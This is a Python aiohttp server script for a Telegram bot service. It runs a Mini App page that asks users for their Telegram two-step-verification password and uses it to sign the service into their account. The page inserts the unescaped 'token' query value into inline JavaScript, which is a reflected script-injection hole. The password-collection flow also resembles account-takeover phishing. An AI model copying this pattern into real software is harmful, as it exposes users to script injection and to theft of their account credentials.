import os
import asyncio
from aiohttp import web

from bot import main as bot_main
from bot import bot, login_state
from multworker import main as multworker_main
from report_scheduler import main as report_scheduler_main
from telegram_connect import confirm_2fa_by_token


async def health(request):
    return web.Response(text="OK", status=200)


async def twofa_page(request):
    token = request.query.get("token", "")

    html = f"""
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Telegram 2FA</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        body {{
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background: #0f172a;
            color: white;
        }}

        .wrap {{
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            box-sizing: border-box;
        }}

        .box {{
            width: 100%;
            max-width: 420px;
            background: #111827;
            padding: 24px;
            border-radius: 18px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.35);
        }}

        h2 {{
            margin-top: 0;
            margin-bottom: 10px;
            font-size: 24px;
        }}

        p {{
            color: #cbd5e1;
            line-height: 1.5;
            margin-bottom: 18px;
        }}

        input {{
            width: 100%;
            box-sizing: border-box;
            padding: 15px;
            border-radius: 12px;
            border: 1px solid #334155;
            background: #020617;
            color: white;
            font-size: 16px;
            outline: none;
        }}

        input:focus {{
            border-color: #22c55e;
        }}

        button {{
            width: 100%;
            margin-top: 14px;
            padding: 15px;
            border: none;
            border-radius: 12px;
            background: #22c55e;
            color: white;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }}

        button:disabled {{
            opacity: 0.6;
            cursor: not-allowed;
        }}

        .msg {{
            margin-top: 14px;
            color: #e2e8f0;
            line-height: 1.4;
            min-height: 24px;
        }}

        .hint {{
            margin-top: 14px;
            font-size: 13px;
            color: #94a3b8;
        }}
    </style>
</head>
<body>
    <div class="wrap">
        <div class="box">
            <h2>🔐 Telegram 2FA</h2>

            <p>
                Введите пароль двухэтапной проверки Telegram.
                Пароль не сохраняется, он используется только один раз для входа.
            </p>

            <input
                id="password"
                type="password"
                placeholder="Пароль 2FA"
                autocomplete="off"
            >

            <button id="btn" onclick="sendPassword()">
                Подключить аккаунт
            </button>

            <div class="msg" id="msg"></div>

            <div class="hint">
                Если пароль неверный — можно попробовать ещё раз.
            </div>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        async function sendPassword() {{
            const passwordInput = document.getElementById("password");
            const btn = document.getElementById("btn");
            const msg = document.getElementById("msg");

            const password = passwordInput.value;

            if (!password) {{
                msg.innerText = "Введите пароль 2FA.";
                return;
            }}

            btn.disabled = true;
            msg.innerText = "🔐 Проверяю пароль...";

            try {{
                const response = await fetch("/api/twofa", {{
                    method: "POST",
                    headers: {{
                        "Content-Type": "application/json"
                    }},
                    body: JSON.stringify({{
                        token: "{token}",
                        password: password
                    }})
                }});

                const data = await response.json();

                msg.innerText = data.message || "Готово";

                if (data.ok) {{
                    setTimeout(() => {{
                        tg.close();
                    }}, 1200);
                }} else {{
                    btn.disabled = false;
                }}

            }} catch (e) {{
                msg.innerText = "Ошибка соединения. Попробуйте ещё раз.";
                btn.disabled = false;
            }}
        }}
    </script>
</body>
</html>
"""

    return web.Response(text=html, content_type="text/html")


async def twofa_api(request):
    try:
        data = await request.json()

        token = data.get("token")
        password = data.get("password")

        if not token or not password:
            return web.json_response({
                "ok": False,
                "message": "❌ Нет токена или пароля."
            })

        owner_user_id, result = await confirm_2fa_by_token(token, password)

        if owner_user_id and result.get("ok"):
            if owner_user_id in login_state:
                del login_state[owner_user_id]

            await bot.send_message(
                chat_id=owner_user_id,
                text=result["message"]
            )

        return web.json_response(result)

    except Exception as e:
        print("❌ TWOFA API ERROR:", repr(e), flush=True)

        return web.json_response({
            "ok": False,
            "message": f"❌ Ошибка mini app: {e}"
        })


async def start_web_server():
    app = web.Application()

    app.router.add_get("/", health)
    app.router.add_get("/health", health)

    app.router.add_get("/twofa", twofa_page)
    app.router.add_post("/api/twofa", twofa_api)

    port = int(os.environ.get("PORT", 10000))

    runner = web.AppRunner(app)
    await runner.setup()

    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()

    print(f"✅ WEB SERVER STARTED ON PORT {port}", flush=True)
    print("✅ TWOFA MINI APP ROUTES ENABLED", flush=True)


async def safe_run(name, func):
    while True:
        try:
            print(f"🚀 STARTING {name}", flush=True)
            await func()
        except Exception as e:
            print(f"❌ {name} CRASHED: {e}", flush=True)
            print(f"🔁 RESTARTING {name} IN 10 SEC", flush=True)
            await asyncio.sleep(10)


async def main():
    print("🔥 START.PY LAUNCHED", flush=True)

    await start_web_server()

    asyncio.create_task(safe_run("BOT", bot_main))
    asyncio.create_task(safe_run("MULTWORKER", multworker_main))
    asyncio.create_task(safe_run("REPORT_SCHEDULER", report_scheduler_main))

    print("✅ ALL TASKS CREATED", flush=True)

    while True:
        await asyncio.sleep(60)


if __name__ == "__main__":
    asyncio.run(main())
